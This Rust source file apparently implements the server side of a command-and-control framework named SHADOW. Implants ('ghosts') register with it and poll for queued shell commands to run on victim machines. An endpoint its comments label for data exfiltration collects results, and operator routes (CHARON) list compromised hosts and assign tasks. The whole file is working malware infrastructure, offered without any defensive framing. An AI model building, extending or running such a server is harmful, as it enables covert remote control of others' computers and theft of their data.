use axum::{
    extract::{State, Path, Query},
    routing::{get, post},
    Json, Router
};
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::{net::SocketAddr, sync::Arc};
use uuid::Uuid;

// GENERAL CONCEPT
// server will handle implants
// each implant has some identifying properties
// -> for now they will be very generic
// each implant can get tasks
// each implant can send back its state
// -> generalize that into a message for now

// === STRUCTS ===
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Implant {
    id: String,         // UUID v7
    hostname: String,   // system hostname of machine on which the implant resides
    os: String,         // operating system, for now we'll just send correct implant, TODO to automatically detect OS and send correct implant
    last_seen: i64      // unix timestamp
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Task {
    id: String,         // UUID v7
    command: String,    // exact command to be executed on target system
    args: String,       // arguments for the above command
    status: String,     // current status, is it sent, pending, done, etc.
    result: Option<String>
}

#[derive(Deserialize)]
struct TaskRequest {
    command: String,
    args: String
}

#[derive(Deserialize)]
struct GhostQuery {
    id: String,
}

// === SHARED STATE ===
struct ServerState {
    implants: DashMap<String, Implant>,
    tasks: DashMap<String, Vec<Task>>
}

// === API handlers ===
// GHOST routes
async fn handle_ghost_register(
    State(state): State<Arc<ServerState>>,
    Json(mut implant): Json<Implant>
) -> Json<String> {
    println!("New ghost registered: {} ({})", implant.hostname, implant.id);

    implant.last_seen = chrono::Utc::now().timestamp();
    state.implants.insert(implant.id.clone(), implant);

    Json("ACK".to_string())
}

async fn handle_ghost_task(
    State(state): State<Arc<ServerState>>,
    Query(params): Query<GhostQuery>
) -> Json<Option<Task>> {
    if let Some(mut tasks_entry) = state.tasks.get_mut(&params.id) {
        if let Some(task) = tasks_entry.iter_mut().find(|t| t.status == "pending") {
            task.status = "sent".to_string();

            return Json(Some(task.clone()));
        }
    }

    if let Some(mut implant) = state.implants.get_mut(&params.id) {
        implant.last_seen = chrono::Utc::now().timestamp();
    }

    Json(None)
}

async fn handle_ghost_data(
    State(state): State<Arc<ServerState>>,
    Json(task_result): Json<Task>
) -> Json<String> {
    println!("Received data for task: {}", task_result.id);

    for mut tasks in state.tasks.iter_mut() {
        if let Some(t) = tasks.iter_mut().find(|t| t.id == task_result.id) {
            *t = task_result.clone();
            break;
        }
    }

    Json("Data received".to_string())
}

// CHARON routes
async fn handle_charon_hello() -> Json<String> {
    Json("CHARON connected. Welcome, Operator.".to_string())
}

async fn handle_charon_ghosts(State(state): State<Arc<ServerState>>) -> Json<Vec<Implant>> {
    let ghosts: Vec<Implant> = state.implants.iter().map(|e| e.value().clone()).collect();
    Json(ghosts)
}

async fn handle_charon_ghost_task(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>,
    Json(req): Json<TaskRequest>
) -> Json<String> {
    let new_task = Task {
        id: Uuid::now_v7().to_string(),
        command: req.command,
        args: req.args,
        status: "pending".to_string(),
        result: None
    };

    println!("Task {} assigned to ghost {}", new_task.id, id);

    state.tasks.entry(id).or_insert_with(Vec::new).push(new_task);

    Json("Task queued".to_string())     // TODO: more verbose
}

#[tokio::main]
async fn main() {
    // init shared state
    let state = Arc::new(ServerState {
        implants: DashMap::new(),
        tasks: DashMap::new()
    });

    // init router with route -> handler mapping
    let app = Router::<Arc<ServerState>>::new()
        .route("/", get(|| async { "Hello, World!" }))      // for testing only
        // GHOST routes
        .route("/ghost", post(handle_ghost_register))       // ghost init (register)
        .route("/ghost/task", get(handle_ghost_task))       // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
        .route("/ghost/data", post(handle_ghost_data))      // endpoint for data exfiltration from ghosts
        // CHARON routes
        .route("/charon", post(handle_charon_hello))        // charon init
        .route("/charon/ghosts", get(handle_charon_ghosts)) // live dashboard
        .route("/charon/ghost/{id}", post(handle_charon_ghost_task)) // assign task to ghost
        .with_state(state);

    // start listening
    let addr = SocketAddr::from(([0, 0, 0, 0], 9999));        // TODO: adress and port configuration via CHARON (NOTE: is this still necessary in Docker? or maybe a separate mechanism would suffice?)
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    
    println!("SHADOW listening on {}", addr);

    axum::serve(listener, app).await.unwrap();
    
}
